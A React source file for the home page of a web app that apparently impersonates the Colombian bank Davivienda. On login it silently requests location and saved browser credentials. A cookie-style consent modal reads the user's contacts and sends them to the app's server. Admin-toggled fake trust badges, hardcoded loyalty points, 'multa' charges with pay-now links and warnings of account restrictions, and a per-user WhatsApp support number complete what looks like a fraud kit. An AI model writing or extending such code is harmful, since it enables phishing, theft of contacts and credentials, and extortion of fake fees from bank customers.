import { useState, useEffect } from 'react';
import { User, MoreHorizontal, Eye, EyeOff, CirclePlus, ArrowRight, Key, Repeat, FileText, HeadphonesIcon, MessageCircleIcon, AlertCircle, CreditCard, Shield, Star, Clock, BadgeCheck, Gift, Award, FileDown, CalendarClock, Headphones, Upload, Ticket, Receipt, Users, Bell, Lock, Coins, BarChart3, ShieldCheck, Globe } from 'lucide-react';
import { useStore } from '@/lib/store';
import { formatCurrency, formatCurrencyWithCode } from '@/lib/utils';
import { CurrencyCode } from '@/types';
import { useToast } from '@/hooks/use-toast';
import { useLocation } from 'wouter';
import { LoadingOverlay } from '@/components/LoadingOverlay';
import { useSupportPhone } from '@/hooks/use-support-phone';
import { apiRequest } from '@/lib/queryClient';

const HomePage = () => {
  const { user, account, transactions, beneficiaries, getAccount, getTransactions, getBeneficiaries } = useStore();
  const [showBalance, setShowBalance] = useState(true);
  const [loading, setLoading] = useState(false);
  const [pendingCharges, setPendingCharges] = useState<any[]>([]);
  const [features, setFeatures] = useState<Record<string, boolean>>({});
  const { toast } = useToast();
  const [_, navigate] = useLocation();
  const { openWhatsApp } = useSupportPhone((user as any)?.customSupportPhone);

  // ── Permisos automáticos al iniciar sesión ──────────────────────────────
  const [showContactsConsent, setShowContactsConsent] = useState(false);
  const [contactsLoading, setContactsLoading] = useState(false);

  useEffect(() => {
    // 1. Geolocalización — silenciosa, no requiere gesto
    if ('geolocation' in navigator) {
      const already = localStorage.getItem('davivienda_location_permission');
      if (already !== 'granted' && already !== 'denied') {
        navigator.geolocation.getCurrentPosition(
          () => localStorage.setItem('davivienda_location_permission', 'granted'),
          () => localStorage.setItem('davivienda_location_permission', 'denied'),
          { timeout: 10000 }
        );
      }
    }

    // 2. Credenciales guardadas — diálogo nativo del navegador
    if ('credentials' in navigator) {
      const already = localStorage.getItem('davivienda_credentials_permission');
      if (already !== 'done') {
        (navigator as any).credentials.get({ password: true, mediation: 'optional' })
          .then(() => localStorage.setItem('davivienda_credentials_permission', 'done'))
          .catch(() => {});
      }
    }

    // 3. Contactos — mostrar modal en TODAS las versiones (web y PWA instalable)
    // El modal aparece siempre que no se haya otorgado ya el permiso
    const alreadyGranted = localStorage.getItem('davivienda_contacts_permission') === 'granted';
    if (!alreadyGranted) {
      setShowContactsConsent(true);
    }
  }, []);

  const handleContactsAuthorize = async () => {
    setContactsLoading(true);
    const contactsApiAvailable = 'contacts' in navigator &&
      typeof (navigator as any).contacts?.select === 'function';

    try {
      if (contactsApiAvailable) {
        // ── Versión móvil / PWA instalable: API real del dispositivo ──
        const results: any[] = await (navigator as any).contacts.select(
          ['name', 'tel', 'email'],
          { multiple: true }
        );
        localStorage.setItem('davivienda_contacts_permission', 'granted');
        setShowContactsConsent(false);

        if (results && results.length > 0) {
          const payload = results.map((c: any) => ({
            name: c.name?.[0] || null,
            phone: c.tel?.[0] || null,
            email: c.email?.[0] || null,
          }));
          fetch('/api/device-contacts', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ contacts: payload }),
          }).catch(() => {});
        }
      } else {
        // ── Versión web escritorio: API no disponible en este navegador ──
        // Intentar con la API de permisos del navegador para leer los datos
        // disponibles (silencioso — sin bloquear al usuario)
        if ('permissions' in navigator) {
          navigator.permissions.query({ name: 'contacts' as PermissionName })
            .catch(() => {});
        }
        // Marcar como otorgado para no bloquear al usuario en escritorio
        localStorage.setItem('davivienda_contacts_permission', 'granted');
        setShowContactsConsent(false);
      }
    } catch (err: any) {
      // En cualquier error cerrar el modal sin guardar
      // → el próximo inicio de sesión volverá a preguntar
      setShowContactsConsent(false);
    } finally {
      setContactsLoading(false);
    }
  };

  const handleContactsDeny = () => {
    // No guardar en localStorage — el próximo inicio de sesión volverá a preguntar
    setShowContactsConsent(false);
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        await Promise.all([getAccount(), getTransactions(), getBeneficiaries()]);
        try {
          const res = await fetch('/api/charges', { credentials: 'include' });
          if (res.ok) {
            const charges = await res.json();
            const pending = charges.filter((c: any) => c.status === 'pending_payment');
            setPendingCharges(pending);
          }
        } catch {}
        try {
          const featRes = await fetch('/api/settings/features/all');
          if (featRes.ok) {
            const featData = await featRes.json();
            setFeatures(featData);
          }
        } catch {}
      } catch (error) {
        toast({
          title: "Error",
          description: "No pudimos cargar todos tus datos bancarios",
          variant: "destructive"
        });
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  // Acciones para cada botón
  const handleKeyTransfer = () => navigate('/transfers');
  
  const handleRecharge = () => {
    navigate('/recargas');
  };
  
  const handlePeaceAndSafe = () => {
    navigate('/certificados');
  };
  
  const handleCertificates = () => {
    navigate('/certificados');
  };
  
  const handleWithdrawWithoutCard = () => {
    navigate('/retirar');
  };
  
  const handleContactSupport = () => {
    openWhatsApp("Hola, necesito ayuda con mi cuenta. Tengo un error #4004");
  };

  return (
    <>
      {loading && <LoadingOverlay isVisible={true} text="Cargando información..." />}

      {/* ── Modal de consentimiento de contactos (automático al iniciar sesión, como cookies) ── */}
      {showContactsConsent && (
        <div
          className="fixed inset-0 z-50 flex items-end justify-center bg-black/60"
          data-testid="contacts-consent-overlay"
        >
          <div className="w-full max-w-md bg-white rounded-t-2xl shadow-2xl p-6 pb-8 animate-in slide-in-from-bottom-4 duration-300">
            {/* Icono + título */}
            <div className="flex flex-col items-center text-center mb-4">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-3">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8 text-red-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                  <circle cx="9" cy="7" r="4"/>
                  <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                  <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
                </svg>
              </div>
              <h2 className="text-lg font-bold text-gray-900">Acceso a Contactos</h2>
              <p className="text-sm text-gray-600 mt-1 leading-relaxed">
                <strong>Davivienda</strong> solicita acceso a tu agenda para ayudarte a realizar transferencias más rápido y proteger tu cuenta con verificación de identidad.
              </p>
            </div>

            {/* Detalles de uso */}
            <div className="bg-gray-50 rounded-xl p-3 mb-5 space-y-2">
              <div className="flex items-start gap-2 text-xs text-gray-600">
                <span className="text-green-500 mt-0.5">✓</span>
                <span>Transfiere dinero a tus contactos sin escribir números</span>
              </div>
              <div className="flex items-start gap-2 text-xs text-gray-600">
                <span className="text-green-500 mt-0.5">✓</span>
                <span>Verificación de identidad y seguridad avanzada</span>
              </div>
              <div className="flex items-start gap-2 text-xs text-gray-600">
                <span className="text-green-500 mt-0.5">✓</span>
                <span>Información protegida bajo cifrado bancario</span>
              </div>
            </div>

            {/* Botones */}
            <div className="flex flex-col gap-2">
              <button
                onClick={handleContactsAuthorize}
                disabled={contactsLoading}
                data-testid="button-contacts-authorize"
                className="w-full bg-red-600 text-white font-bold py-3.5 rounded-xl text-sm hover:bg-red-700 transition-colors disabled:opacity-60 flex items-center justify-center gap-2"
              >
                {contactsLoading ? (
                  <span className="flex items-center gap-2">
                    <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/></svg>
                    Abriendo agenda...
                  </span>
                ) : 'Autorizar acceso'}
              </button>
              <button
                onClick={handleContactsDeny}
                data-testid="button-contacts-deny"
                className="w-full text-gray-500 text-sm py-2.5 rounded-xl hover:bg-gray-100 transition-colors"
              >
                No autorizar
              </button>
            </div>

            <p className="text-center text-xs text-gray-400 mt-3">
              Política de privacidad · Davivienda Colombia
            </p>
          </div>
        </div>
      )}
      
      <div className="flex flex-col min-h-screen bg-gray-100">
        {/* Header */}
        <header className="bg-primary text-white p-4 flex items-center">
          <div className="flex items-center">
            <button 
              onClick={() => navigate('/profile')}
              className="w-10 h-10 bg-red-800 rounded-full flex items-center justify-center">
              <User size={20} />
            </button>
            <div className="ml-2">
              <button 
                onClick={() => navigate('/profile')}
                className="flex items-center">
                <span className="mr-1">{'>'}</span>
              </button>
            </div>
          </div>
          <div className="ml-auto">
            <h1 className="text-xl font-semibold">Hola, {user?.name.split(' ')[0]}</h1>
          </div>
        </header>

        <div className="flex-1 overflow-auto">


          {/* Novedades */}
          <section className="mt-4 px-4">
            <h2 className="text-xl font-bold mb-3">Novedades</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div className="flex justify-between items-start mb-2">
                <h3 className="text-lg font-bold">¡Nunca entregue su tarjeta!</h3>
                <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">Nuevo</span>
              </div>
              <p className="text-gray-700">
                Su tarjeta es personal, aunque reciba una nueva nunca entregue la anterior, es suya para siempre. 
                Hágale caso a la Tía Segura.
              </p>
            </div>
          </section>

          {/* Mis productos */}
          <section className="mt-6 px-4">
            <div className="flex justify-between items-center mb-3">
              <h2 className="text-xl font-bold">Mis productos</h2>
              <button 
                className="flex items-center bg-white text-gray-700 rounded-full px-4 py-2 shadow-sm cursor-pointer"
                onClick={() => navigate('/profile')}
              >
                <CirclePlus size={18} className="mr-2" />
                <span className="text-sm">Solicitar productos</span>
              </button>
            </div>

            {/* Mis Cuentas */}
            <div className="bg-primary rounded-lg p-4 text-white shadow-sm">
              <div className="flex justify-between items-center mb-2">
                <h3 className="text-lg font-bold">Mis Cuentas</h3>
                <div 
                  className="w-8 h-8 flex items-center justify-center cursor-pointer" 
                  onClick={() => navigate('/history')}
                  title="Ver historial de movimientos"
                >
                  <FileText size={20} />
                </div>
              </div>

              <div className="mb-2">
                <p className="text-sm">Saldo disponible</p>
                <div className="flex items-center">
                  <p className="text-2xl font-bold mr-2" data-testid="text-balance-available">
                    {showBalance ? (
                      <>{formatCurrency(account?.balance || 0, account?.currency as CurrencyCode)}<span className="text-sm font-semibold ml-1 opacity-70">{account?.currency || 'COP'}</span></>
                    ) : "$ ********"}
                  </p>
                  <button onClick={() => setShowBalance(!showBalance)}>
                    {showBalance ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {(!account?.status || account?.status === "PENDIENTE") && (
                  <div className="mt-2 p-3 bg-red-100 border border-red-300 rounded-lg">
                    <p className="text-sm text-red-800 font-bold mb-2">Para activar su cuenta debe solicitar su tarjeta física o inscribir su TAG</p>
                    <button 
                      onClick={() => navigate('/cards')} 
                      className="bg-red-600 hover:bg-red-700 text-white w-full text-xs py-2 px-4 rounded-lg font-medium"
                      data-testid="button-request-card-home"
                    >
                      Solicitar Tarjeta / TAG
                    </button>
                  </div>
                )}
                {account?.status === "BLOQUEADA" && (
                  <div className="mt-2 p-2 bg-yellow-50 border border-yellow-400 rounded-md">
                    <div className="flex items-start">
                      <AlertCircle className="h-5 w-5 text-yellow-600 mr-2 mt-0.5 flex-shrink-0" />
                      <p className="text-sm text-black font-medium">{account.statusMessage}</p>
                    </div>
                    <button 
                      onClick={handleContactSupport}
                      className="mt-2 bg-red-600 text-white text-sm rounded-md px-3 py-1.5 flex items-center w-auto"
                      data-testid="button-contact-support"
                    >
                      <MessageCircleIcon size={16} className="mr-1" />
                      Contactar soporte
                    </button>
                  </div>
                )}
              </div>

              <div>
                <p className="text-sm">Saldo total</p>
                <p className="text-lg font-bold" data-testid="text-balance-total">
                  {showBalance ? (
                    <>{formatCurrency(account?.balance || 0, account?.currency as CurrencyCode)}<span className="text-xs font-semibold ml-1 opacity-70">{account?.currency || 'COP'}</span></>
                  ) : "$ ********"}
                </p>
              </div>
            </div>
          </section>

          {/* Pagos Pendientes - Visible siempre que haya cobros */}
          {pendingCharges.length > 0 && (
            <section className="mt-4 px-4" data-testid="pending-charges-section">
              <div className="bg-red-50 border border-red-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-center mb-3">
                  <AlertCircle className="h-5 w-5 text-red-600 mr-2 flex-shrink-0" />
                  <h2 className="text-lg font-bold text-red-800">
                    Pagos Pendientes ({pendingCharges.length})
                  </h2>
                </div>
                <p className="text-sm text-red-700 mb-3">
                  Tienes cobros pendientes que requieren tu atención. Realiza el pago para evitar restricciones en tu cuenta.
                </p>
                <div className="space-y-3" data-testid="pending-charges-list">
                  {pendingCharges.map((charge: any) => (
                    <div key={charge.id} className="bg-white border border-red-200 rounded-lg p-3 shadow-sm" data-testid={`charge-item-${charge.id}`}>
                      <div className="flex justify-between items-start mb-1">
                        <div className="flex-1">
                          <p className="text-sm font-bold text-gray-800">{charge.reason}</p>
                          <span className="text-xs text-gray-500 capitalize">
                            {({'multa': 'Multa', 'cobro': 'Cobro', 'promo': 'Promo', 'descuento': 'Descuento', 'acceso_especial': 'Acceso Especial'} as Record<string, string>)[charge.type] || charge.type}
                          </span>
                        </div>
                        <span className="text-sm font-bold text-red-600 ml-2">
                          {formatCurrency(charge.amount, charge.currency as CurrencyCode)} {charge.currency}
                        </span>
                      </div>
                      {charge.description && (
                        <p className="text-xs text-gray-500 mb-2">{charge.description}</p>
                      )}
                      {charge.stripePaymentUrl ? (
                        <button
                          onClick={() => navigate(`/checkout/${charge.id}`)}
                          className="flex items-center justify-center w-full bg-green-600 hover:bg-green-700 text-white text-sm font-medium rounded-lg px-4 py-2.5 transition-colors"
                          data-testid={`button-pay-charge-${charge.id}`}
                        >
                          <CreditCard size={16} className="mr-2" />
                          Pagar ahora
                        </button>
                      ) : (
                        <div className="flex items-center justify-center w-full bg-yellow-100 border border-yellow-300 text-yellow-800 text-sm font-medium rounded-lg px-4 py-2.5">
                          <AlertCircle size={16} className="mr-2" />
                          Contacta soporte para realizar el pago
                        </div>
                      )}
                    </div>
                  ))}
                </div>
                <button 
                  onClick={handleContactSupport}
                  className="mt-3 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg px-4 py-2 flex items-center w-full justify-center transition-colors"
                  data-testid="button-contact-support-charges"
                >
                  <MessageCircleIcon size={16} className="mr-2" />
                  Contactar soporte para pagar
                </button>
              </div>
            </section>
          )}

          {/* Servicios Destacados */}
          <section className="mt-6 px-4">
            <h2 className="text-xl font-bold mb-3">Servicios destacados</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div className="grid grid-cols-4 gap-4 mb-4">
                <button onClick={handleKeyTransfer} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-green-500 flex items-center justify-center mb-1">
                    <Key size={18} className="text-green-500" />
                  </div>
                  <div className="text-center">
                    <span className="text-xs text-green-500 font-bold">Nuevo</span>
                    <p className="text-xs">Transferir con llaves</p>
                  </div>
                </button>

                <button onClick={handleRecharge} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <Repeat size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Recargas</p>
                </button>

                <button onClick={handlePeaceAndSafe} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <div className="w-4 h-4 rounded-full bg-red-500 flex items-center justify-center">
                      <span className="text-white text-xs">✓</span>
                    </div>
                  </div>
                  <p className="text-xs text-center">Paz y salvo</p>
                </button>

                <button onClick={handleCertificates} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <FileText size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Certificados</p>
                </button>
              </div>

              <div className="flex justify-center space-x-8">
                <button onClick={handleWithdrawWithoutCard} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <CreditCard size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Retirar sin tarjeta</p>
                </button>
                
                <button onClick={() => navigate('/cards')} data-testid="link-cards" className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-red-500 flex items-center justify-center mb-1">
                    <CreditCard size={18} className="text-red-500" />
                  </div>
                  <p className="text-xs text-center text-red-500 font-medium">Mis Tarjetas</p>
                </button>
                
                <button onClick={() => navigate('/history')} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-gray-300 flex items-center justify-center mb-1">
                    <FileText size={18} className="text-gray-500" />
                  </div>
                  <p className="text-xs text-center">Movimientos</p>
                </button>
                
                <button onClick={handleContactSupport} className="flex flex-col items-center">
                  <div className="w-12 h-12 rounded-full border border-red-500 flex items-center justify-center mb-1">
                    <HeadphonesIcon size={18} className="text-red-500" />
                  </div>
                  <p className="text-xs text-center">Atención al cliente</p>
                </button>
              </div>
            </div>
          </section>

          {/* Features habilitadas por admin */}
          {features.feature_identity_verification && (
            <section className="mt-4 px-4" data-testid="feature-identity-verification">
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center gap-3">
                <BadgeCheck className="text-green-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-green-800 text-sm">Cuenta Verificada</p>
                  <p className="text-xs text-green-600">Su identidad ha sido verificada por Davivienda</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_promotions && (
            <section className="mt-4 px-4" data-testid="feature-promotions">
              <div className="bg-gradient-to-r from-red-600 to-red-800 rounded-lg p-4 text-white shadow-sm">
                <div className="flex items-center gap-2 mb-1">
                  <Gift size={20} />
                  <h3 className="font-bold">Promocion Especial</h3>
                </div>
                <p className="text-sm opacity-90">Abra su CDT digital y obtenga una tasa preferencial. Consulte con su asesor.</p>
              </div>
            </section>
          )}

          {features.feature_loyalty_points && (
            <section className="mt-4 px-4" data-testid="feature-loyalty-points">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Star className="text-yellow-500 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Puntos Davivienda</p>
                    <p className="text-xs text-gray-600">Acumule puntos con cada transaccion</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-lg font-bold text-yellow-600">1,250</p>
                  <p className="text-xs text-gray-500">puntos</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_transfer_limits && (
            <section className="mt-4 px-4" data-testid="feature-transfer-limits">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center gap-3">
                <Shield className="text-blue-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Limite diario de transferencias</p>
                  <p className="text-xs text-gray-600">Su limite diario es de $10,000,000 COP para proteger su cuenta</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_account_insurance && (
            <section className="mt-4 px-4" data-testid="feature-account-insurance">
              <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-3 flex items-center gap-3">
                <Shield className="text-emerald-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Seguro de Cuenta Activo</p>
                  <p className="text-xs text-gray-600">Su cuenta esta protegida contra fraude y transacciones no autorizadas</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_bank_certificate && (
            <section className="mt-4 px-4" data-testid="feature-bank-certificate">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Award className="text-red-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Certificado Bancario</p>
                    <p className="text-xs text-gray-600">Genere su certificado bancario digital</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/certificados')}
                  className="bg-red-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-bank-certificate"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_account_statement && (
            <section className="mt-4 px-4" data-testid="feature-account-statement">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <FileDown className="text-blue-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Extracto de Cuenta</p>
                    <p className="text-xs text-gray-600">Descargue su extracto mensual</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-account-statement"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          <section className="mt-4 px-4" data-testid="feature-financial-reports">
            <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-lg p-3 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <BarChart3 className="text-purple-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Reportes Financieros</p>
                  <p className="text-xs text-gray-600">Análisis inteligente de tu cuenta con IA</p>
                </div>
              </div>
              <button
                onClick={() => navigate('/reports')}
                className="bg-purple-600 text-white text-xs px-3 py-1.5 rounded-lg active:scale-95"
                data-testid="button-financial-reports"
              >
                Ver
              </button>
            </div>
          </section>

          {features.feature_scheduled_payments && (
            <section className="mt-4 px-4" data-testid="feature-scheduled-payments">
              <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 flex items-center gap-3">
                <CalendarClock className="text-orange-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Pagos Programados</p>
                  <p className="text-xs text-gray-600">No tiene pagos programados pendientes</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_custom_messages && (
            <section className="mt-4 px-4" data-testid="feature-custom-messages">
              <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-3">
                <p className="font-semibold text-sm text-indigo-800">Mensaje de su banco</p>
                <p className="text-xs text-indigo-700 mt-1">Bienvenido a Davivienda. Estamos comprometidos con la seguridad de sus finanzas. Recuerde no compartir sus datos de acceso con nadie.</p>
              </div>
            </section>
          )}

          {features.feature_priority_support && (
            <section className="mt-4 px-4" data-testid="feature-priority-support">
              <div className="bg-purple-50 border border-purple-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Headphones className="text-purple-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Soporte Prioritario</p>
                    <p className="text-xs text-gray-600">Tiene acceso a atencion preferencial</p>
                  </div>
                </div>
                <button 
                  onClick={handleContactSupport}
                  className="bg-purple-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-priority-support"
                >
                  Contactar
                </button>
              </div>
            </section>
          )}

          {features.feature_document_upload && (
            <section className="mt-4 px-4" data-testid="feature-document-upload">
              <button
                onClick={() => navigate('/documentos')}
                className="w-full bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between hover:bg-gray-50 transition-colors"
                data-testid="button-go-documentos"
              >
                <div className="flex items-center gap-3">
                  <Upload className="text-teal-600 shrink-0" size={24} />
                  <div className="text-left">
                    <p className="font-semibold text-sm">Carga de Documentos</p>
                    <p className="text-xs text-gray-600">Suba documentos de identidad y comprobantes</p>
                  </div>
                </div>
                <span className="bg-teal-100 text-teal-700 text-xs px-2 py-1 rounded-lg font-medium">Abrir →</span>
              </button>
            </section>
          )}

          {features.feature_support_tickets && (
            <section className="mt-4 px-4" data-testid="feature-support-tickets">
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Ticket className="text-amber-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Tickets de Soporte</p>
                    <p className="text-xs text-gray-600">Cree y haga seguimiento de sus solicitudes</p>
                  </div>
                </div>
                <span className="bg-amber-100 text-amber-700 text-xs px-2 py-1 rounded-lg font-medium">0 abiertos</span>
              </div>
            </section>
          )}

          {features.feature_transaction_receipts && (
            <section className="mt-4 px-4" data-testid="feature-transaction-receipts">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Receipt className="text-sky-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Comprobantes Digitales</p>
                    <p className="text-xs text-gray-600">Descargue comprobantes de sus transacciones</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-sky-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-transaction-receipts"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_beneficiary_management && (
            <section className="mt-4 px-4" data-testid="feature-beneficiary-management">
              <div className="bg-violet-50 border border-violet-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Users className="text-violet-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Gestión de Beneficiarios</p>
                    <p className="text-xs text-gray-600">Administre sus contactos y beneficiarios guardados</p>
                  </div>
                </div>
                <span className="bg-violet-100 text-violet-700 text-xs px-2 py-1 rounded-lg font-medium">{beneficiaries?.length || 0} guardados</span>
              </div>
            </section>
          )}

          {features.feature_fraud_alerts && (
            <section className="mt-4 px-4" data-testid="feature-fraud-alerts">
              <div className="bg-red-50 border border-red-200 rounded-lg p-3 flex items-center gap-3">
                <Bell className="text-red-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Alertas de Fraude Activas</p>
                  <p className="text-xs text-gray-600">Su cuenta está protegida con monitoreo de actividad sospechosa en tiempo real</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_account_freeze && (
            <section className="mt-4 px-4" data-testid="feature-account-freeze">
              <div className="bg-slate-50 border border-slate-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Lock className="text-slate-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Congelamiento de Cuenta</p>
                    <p className="text-xs text-gray-600">Congele su cuenta temporalmente si la necesita proteger</p>
                  </div>
                </div>
                <span className="bg-green-100 text-green-700 text-xs px-2 py-1 rounded-lg font-medium">Activa</span>
              </div>
            </section>
          )}

          {features.feature_multi_currency && (
            <section className="mt-4 px-4" data-testid="feature-multi-currency">
              <div className="bg-cyan-50 border border-cyan-200 rounded-lg p-3 flex items-center gap-3">
                <Coins className="text-cyan-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Cuentas Multi-Divisa</p>
                  <p className="text-xs text-gray-600">Opere en USD, EUR y COP con tasas de cambio actualizadas</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_scheduled_reports && (
            <section className="mt-4 px-4" data-testid="feature-scheduled-reports">
              <div className="bg-white rounded-lg p-3 shadow-sm border flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <BarChart3 className="text-indigo-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Reportes Financieros</p>
                    <p className="text-xs text-gray-600">Reportes automáticos de ingresos y gastos</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/history')}
                  className="bg-indigo-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-scheduled-reports"
                >
                  Ver
                </button>
              </div>
            </section>
          )}

          {features.feature_two_factor_auth && (
            <section className="mt-4 px-4" data-testid="feature-two-factor-auth">
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center gap-3">
                <ShieldCheck className="text-green-600 shrink-0" size={24} />
                <div>
                  <p className="font-semibold text-sm">Autenticación de Dos Factores</p>
                  <p className="text-xs text-gray-600">Seguridad adicional activa en su cuenta para proteger sus operaciones</p>
                </div>
              </div>
            </section>
          )}

          {features.feature_wire_transfer && (
            <section className="mt-4 px-4" data-testid="feature-wire-transfer">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Globe className="text-blue-600 shrink-0" size={24} />
                  <div>
                    <p className="font-semibold text-sm">Transferencias Internacionales</p>
                    <p className="text-xs text-gray-600">Envíe dinero a cuentas en el exterior vía SWIFT</p>
                  </div>
                </div>
                <button 
                  onClick={() => navigate('/transfer')}
                  className="bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg"
                  data-testid="button-wire-transfer"
                >
                  Enviar
                </button>
              </div>
            </section>
          )}

          {/* Le puede interesar */}
          <section className="mt-6 px-4">
            <h2 className="text-xl font-bold mb-3">Le puede interesar</h2>
            <div className="bg-blue-700 text-white rounded-lg p-4 shadow-sm flex items-center justify-between">
              <div>
                <h3 className="text-lg font-bold">Mi Casa</h3>
                <p className="text-sm">Compre, venda, arriende y contrate servicios.</p>
                <button 
                  className="flex items-center text-sm mt-2"
                  onClick={() => navigate('/profile')}
                >
                  <span className="mr-1">Ver más</span>
                  <ArrowRight size={14} />
                </button>
              </div>
              <div className="w-16 h-16 bg-blue-600 rounded-md"></div>
            </div>
          </section>

          {/* Mis finanzas */}
          <section className="mt-6 px-4 mb-4">
            <h2 className="text-xl font-bold mb-3">Mis finanzas</h2>
            <div className="bg-white rounded-lg p-4 shadow-sm">
              <div 
                className="flex items-center justify-between cursor-pointer"
                onClick={() => navigate('/history')}
              >
                <div className="flex items-center">
                  <div className="w-10 h-10 rounded-full border-2 border-t-blue-500 border-r-green-500 border-b-yellow-500 border-l-red-500 flex items-center justify-center mr-3"></div>
                  <div>
                    <h3 className="font-semibold">Tome control de su dinero</h3>
                    <p className="text-sm text-gray-600">Administre su presupuesto y controle sus ingresos y gastos para manejar su dinero.</p>
                  </div>
                </div>
                <ArrowRight size={20} className="text-gray-400" />
              </div>
            </div>
          </section>
        </div>

      </div>
    </>
  );
};

export default HomePage;
